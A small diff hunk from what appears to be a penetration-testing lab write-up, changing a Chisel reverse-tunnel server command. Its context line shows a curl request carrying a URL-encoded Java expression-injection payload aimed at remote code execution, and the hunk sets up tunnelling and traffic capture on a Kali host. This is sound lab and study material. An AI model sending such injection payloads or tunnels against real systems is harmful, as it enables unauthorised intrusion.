@@ -20,7 +20,7 @@ curl -v http://192.168.180.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%
 ...
 
 # Now host the Chisel server and listen to the 8080 port
-chisel server --port 8080 --reverse
+./chisel server --port 8080 --reverse
 
 # Before run the Chisel client, we can tcpdump on KALI to log incoming traffic. 
 sudo tcpdump -nvvvXi tun0 tcp port 8080
